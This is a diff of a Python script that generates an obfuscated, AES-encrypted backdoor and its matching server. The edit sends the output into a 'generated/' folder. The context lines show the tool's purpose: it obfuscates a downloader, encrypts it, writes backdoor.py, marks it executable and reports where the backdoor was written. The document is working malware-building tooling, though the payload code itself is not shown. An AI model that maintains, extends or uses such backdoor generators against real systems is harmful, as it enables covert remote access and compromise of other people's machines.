@@ -87,14 +87,14 @@ else:
 	exit()
 
 if args.backdoorname:
-	backdoorName = args.backdoorname
+	backdoorName = "generated/" + args.backdoorname
 else:
-	backdoorName = "backdoor.py"
+	backdoorName = "generated/backdoor.py"
 
 if args.servername:
-	serverName = args.servername
+	serverName = "generated/" + args.servername
 else:
-	serverName = "server.py"
+	serverName = "generated/server.py"
 
 if args.proxy:
 	if args.obfuscate:
@@ -194,6 +194,8 @@ downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
 downloader = EncodeAES(cipher, downloaderscript)
+if not os.path.isdir('generated'):
+	os.makedirs('generated')
 
 with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
@@ -212,4 +214,5 @@ with open(serverName, 'wb') as se:
 
 if os.name == 'posix':
 	os.system('chmod +x %s %s' % (backdoorName, serverName))
+
 print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
